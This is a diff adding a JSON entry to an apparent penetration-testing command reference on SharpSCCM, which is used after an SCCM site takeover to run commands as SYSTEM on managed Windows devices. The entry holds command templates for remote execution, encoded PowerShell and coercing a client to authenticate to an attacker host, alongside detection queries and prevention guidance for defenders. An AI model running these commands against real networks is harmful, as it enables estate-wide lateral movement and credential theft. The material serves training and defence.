@@ -1,0 +1,103 @@
+{
+  "id": "sccm-app-deployment-exec",
+  "name": "SharpSCCM - Application Deployment Execution (Post-Takeover)",
+  "command": "SharpSCCM.exe exec -d <target> -p \"<command>\"",
+  "description": "After gaining SCCM Full Administrator (site takeover) or sufficient console rights, SharpSCCM's exec / the admin service can deploy an application or run a program against a target device or collection. SCCM installs run in the SYSTEM context on the client, so pushing a command, script, or installer provides reliable SYSTEM-level code execution and lateral movement across every managed endpoint - the payoff of SCCM compromise.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "SCCM Attacks",
+  "certifications": [
+    "CRTP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Misconfiguration Manager (EXEC); SharpSCCM",
+  "tags": [
+    "sccm",
+    "mecm",
+    "sharpsccm",
+    "software-deployment",
+    "lateral-movement",
+    "system",
+    "admin-service"
+  ],
+  "mitre": [
+    "T1072",
+    "T1078.002"
+  ],
+  "exam": "restricted",
+  "notes": "=== EXECUTE ON A DEVICE (runs as SYSTEM) ===\n  # Deploy a one-liner / application to a specific device:\n  SharpSCCM.exe exec -d <target> -p \"<command>\"\n  # Target by resource id instead of name:\n  SharpSCCM.exe exec -rid <resourceid> -p \"powershell -enc <b64>\"\n\n=== COERCE A DEVICE TO AUTH (relay primitive) ===\n  # exec can also force the client to authenticate to you (NTLM capture/relay):\n  SharpSCCM.exe exec -d <target> -r <lhost>\n\n=== VIA THE ADMIN SERVICE (REST) ===\n  # With Full Admin, create an application + deployment to a collection:\n  #   POST https://<smsprovider>/AdminService/wmi/SMS_Application\n  #   then SMS_ApplicationDeployment to the target collection\n  # or use the console / PowerShell cmdlets (New-CMApplication, Invoke-CMScript)\n\n=== CLEANUP ===\n  # Remove the application/deployment and collection membership you created\n  SharpSCCM.exe exec --help   # review removal flags for the objects you added\n\n=== WHY IT WORKS ===\n  - SCCM client agent executes deployments as NT AUTHORITY\\SYSTEM.\n  - A Full Administrator can target any device or collection in the hierarchy.\n\n=== ALTERNATIVES ===\n  impacket psexec/wmiexec       # direct exec if you already hold creds\n  Invoke-CMScript (console)     # built-in script execution",
+  "examples": [
+    {
+      "label": "Run a command on a device as SYSTEM",
+      "command": "SharpSCCM.exe exec -d <target> -p \"<command>\""
+    },
+    {
+      "label": "Target by resource id with encoded PS",
+      "command": "SharpSCCM.exe exec -rid <resourceid> -p \"powershell -enc <b64>\""
+    },
+    {
+      "label": "Coerce a client to authenticate to you",
+      "command": "SharpSCCM.exe exec -d <target> -r <lhost>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Misconfiguration Manager - EXEC",
+      "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+    },
+    {
+      "title": "SharpSCCM",
+      "url": "https://github.com/Mayyhem/SharpSCCM"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sccm-site-takeover-relay",
+      "note": "Gain Full Administrator before deploying payloads.",
+      "rel": "prereq"
+    },
+    {
+      "id": "impacket-exec",
+      "note": "Direct remote exec alternative once you hold creds.",
+      "rel": "alternative"
+    },
+    {
+      "id": "secretsdump-ntds",
+      "note": "Dump domain secrets after SYSTEM on key hosts.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "SCCM is designed to run deployed applications and scripts in the SYSTEM context on managed clients, and a Full Administrator can target any device or collection. An attacker who has taken over the site therefore has a sanctioned, built-in mechanism for SYSTEM-level execution estate-wide.",
+    "prerequisites": "SCCM Full Administrator (or Application Author/Deployment rights) and a reachable Management Point/admin service; the target devices must have the SCCM client installed and checking in.",
+    "impact": "SYSTEM-level code execution on any managed endpoint, enabling mass lateral movement, credential theft, and domain compromise.",
+    "detection": "[MITRE T1072] New application/package + deployment created and immediately targeted at a device or ad-hoc collection; CcmExec spawning cmd/powershell with suspicious arguments on clients; off-hours deployments from an unusual admin.",
+    "artifacts": "SCCM console audit (SMS_Application, SMS_Deployment creation); client AppEnforce.log / execmgr.log; Sysmon process creation where parent is CcmExec.exe spawning cmd.exe/powershell.exe; 4688 process-creation events under SYSTEM.",
+    "splunk_spl": "index=windows EventCode=1 ParentImage=\"*CcmExec.exe\" (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\" OR Image=\"*rundll32.exe\")\n| stats count by Computer, Image, CommandLine\n| where count > 0",
+    "elastic_kql": "process.parent.name:\"CcmExec.exe\" and process.name:(\"powershell.exe\" or \"cmd.exe\" or \"rundll32.exe\")",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"CcmExec.exe\"\n| where FileName in~ (\"powershell.exe\", \"cmd.exe\", \"rundll32.exe\", \"mshta.exe\")\n| project TimeGenerated, DeviceName, FileName, ProcessCommandLine",
+    "sigma_rules": "win_sccm_ccmexec_spawns_shell",
+    "prevention": "Limit SCCM Full Administrator and application-authoring roles (RBAC, least privilege, Tier 0); require approval workflows for new applications/deployments; alert on new app+deployment creation and on CcmExec spawning shells; enable Enhanced HTTP/PKI and monitor the admin service; review collection membership changes.",
+    "sources": [
+      "https://github.com/subat0mik/Misconfiguration-Manager",
+      "https://github.com/Mayyhem/SharpSCCM"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "SCCM client agent (CcmExec) spawns a command interpreter",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"CcmExec.exe\"\n| where FileName in~ (\"powershell.exe\", \"cmd.exe\", \"rundll32.exe\", \"mshta.exe\")\n| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1072"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate SCCM application/script deployments also spawn interpreters.",
+        "tuning": "Baseline approved deployments and packages; alert on interpreters with encoded/obfuscated command lines or outbound network activity."
+      }
+    ]
+  }
+}
